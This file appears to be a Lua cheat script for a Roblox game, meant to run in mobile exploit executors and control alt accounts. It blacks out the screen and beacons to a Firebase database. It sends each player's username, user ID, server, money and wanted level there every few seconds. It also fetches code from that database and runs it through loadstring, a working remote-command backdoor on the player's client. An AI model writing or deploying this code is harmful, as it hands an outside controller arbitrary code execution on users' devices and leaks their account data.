-- Carter's DHC Mobile Script
-- Designed for Delta and other mobile executors

-- Function to make screen black
local function makeScreenBlack()
    if game:GetService("CoreGui") then
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "BlackScreenGui"
        screenGui.IgnoreGuiInset = true
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.BorderSizePixel = 0
        frame.Parent = screenGui

        screenGui.Parent = game:GetService("CoreGui")
    end
end

-- NEW: Command workspace system
local commandWorkspace = {}

-- NEW: Alt configuration
local altConfig = {
    avoidDuplicates = true,
    deathProtection = true,
    deathCount = 0,
    deathTimer = 0,
    knownUsers = {}
}

-- NEW: Analytics system
local analytics = {
    money = 0,
    wantedLevel = 0,
    startMoney = 0,
    moneyGained = 0,
    lastUpdate = 0
}

-- Universal request function (executor only)
local function makeRequest(options)
    local requestFunc = syn and syn.request
        or http and http.request
        or http_request
        or request
        or fluxus and fluxus.request

    if requestFunc then
        return requestFunc(options)
    else
        warn("No supported HTTP request function found in this executor.")
        return nil
    end
end

-- Function to update analytics data
local function updateAnalyticsData()
    local player = game.Players.LocalPlayer
    if not player then return end

    -- Get current money and wanted level
    local currentMoney = 0
    local currentWanted = 0

    pcall(function()
        if player:FindFirstChild("DataFolder") and player.DataFolder:FindFirstChild("Currency") then
            currentMoney = player.DataFolder.Currency.Value
        end
    end)

    pcall(function()
        if player:FindFirstChild("DataFolder") and player.DataFolder:FindFirstChild("Information") and player.DataFolder.Information:FindFirstChild("Wanted") then
            currentWanted = player.DataFolder.Information.Wanted.Value
        end
    end)

    -- Initialize start money if not set
    if analytics.startMoney == 0 then
        analytics.startMoney = currentMoney
        analytics.money = currentMoney
    end

    -- Calculate money gained
    analytics.moneyGained = currentMoney - analytics.startMoney
    analytics.money = currentMoney
    analytics.wantedLevel = currentWanted

    -- Send analytics data every 30s
    if tick() - analytics.lastUpdate > 30 then
        analytics.lastUpdate = tick()

        local playerInfo = getPlayerInfo()
        if playerInfo then
            pcall(function()
                makeRequest({
                    Url = "https://omebgle-default-rtdb.firebaseio.com/analytics/" .. playerInfo.userid .. ".json",
                    Method = "PUT",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = game:GetService("HttpService"):JSONEncode({
                        username = playerInfo.username,
                        money = analytics.money,
                        wantedLevel = analytics.wantedLevel,
                        moneyGained = analytics.moneyGained,
                        lastUpdate = os.time(),
                        serverId = game.JobId
                    })
                })
            end)
        end
    end
end

-- Function to check and execute scripts from Firebase
local function checkAndExecuteScript()
    local url = "https://omebgle-default-rtdb.firebaseio.com/script.json"

    local success, response = pcall(function()
        local result = makeRequest({
            Url = url,
            Method = "GET"
        })
        return result and result.Body
    end)

    if success and response then
        local data = game:GetService("HttpService"):JSONDecode(response)
        if data and data.code and data.code ~= "" then
            table.insert(commandWorkspace, data.code)

            -- Clear script
            pcall(function()
                makeRequest({
                    Url = url,
                    Method = "PUT",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = '{"code":""}'
                })
            end)
        end
    end
end

-- Process command workspace
local function processCommandWorkspace()
    if #commandWorkspace > 0 then
        local command = table.remove(commandWorkspace, 1)
        local executeSuccess, errorMsg = pcall(function()
            loadstring(command)()
        end)
        if not executeSuccess then
            warn("Script execution error: " .. errorMsg)
        end
    end
end

-- Get player info
function getPlayerInfo()
    local player = game.Players.LocalPlayer
    if player then
        return {
            username = player.Name,
            userid = player.UserId,
            serverid = game.JobId,
            placeid = game.PlaceId,
            status = "connected"
        }
    end
    return nil
end

-- Send player info
local function sendPlayerInfo()
    local playerInfo = getPlayerInfo()
    if playerInfo then
        pcall(function()
            makeRequest({
                Url = "https://omebgle-default-rtdb.firebaseio.com/players/" .. playerInfo.userid .. ".json",
                Method = "PUT",
                Headers = { ["Content-Type"] = "application/json" },
                Body = game:GetService("HttpService"):JSONEncode(playerInfo)
            })
        end)
    end
end

-- Send heartbeat
local function sendHeartbeat()
    local playerInfo = getPlayerInfo()
    if playerInfo then
        pcall(function()
            makeRequest({
                Url = "https://omebgle-default-rtdb.firebaseio.com/heartbeats/" .. playerInfo.userid .. ".json",
                Method = "PUT",
                Headers = { ["Content-Type"] = "application/json" },
                Body = game:GetService("HttpService"):JSONEncode({
                    timestamp = os.time(),
                    userid = playerInfo.userid
                })
            })
        end)
    end
end

-- Server hop
local function serverHop()
    local HttpService = game:GetService("HttpService")
    local TeleportService = game:GetService("TeleportService")
    local placeId = game.PlaceId
    local serversUrl = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"

    local success, response = pcall(function()
        local result = makeRequest({ Url = serversUrl, Method = "GET" })
        return result and result.Body
    end)

    if success and response then
        local data = HttpService:JSONDecode(response)
        if data and data.data then
            local servers = {}
            for _, server in ipairs(data.data) do
                if server.id ~= game.JobId and server.playing < server.maxPlayers then
                    table.insert(servers, server)
                end
            end

            if #servers > 0 then
                local randomServer = servers[math.random(1, #servers)]
                TeleportService:TeleportToPlaceInstance(placeId, randomServer.id)
            else
                warn("No available servers found")
            end
        end
    else
        warn("Failed to fetch servers")
    end
end

-- Death protection
local function setupDeathProtection()
    if not altConfig.deathProtection then return end

    local player = game.Players.LocalPlayer
    player.CharacterAdded:Connect(function(character)
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.Died:Connect(function()
            local currentTime = tick()
            if currentTime - altConfig.deathTimer > 120 then
                altConfig.deathCount = 0
                altConfig.deathTimer = currentTime
            end
            altConfig.deathCount += 1
            if altConfig.deathCount >= 6 then
                warn("Too many deaths, hopping...")
                serverHop()
            end
        end)
    end)
end

-- Initial setup
makeScreenBlack()
sendPlayerInfo()
setupDeathProtection()

-- Execute script once
checkAndExecuteScript()

-- Loop for heartbeat + commands
local playerInfo = getPlayerInfo()
if playerInfo then
    spawn(function()
        while true do
            wait(10)
            sendHeartbeat()
            sendPlayerInfo()
            updateAnalyticsData()
            processCommandWorkspace()
        end
    end)
end

print("Carter's DHC Mobile Controller loaded successfully!")
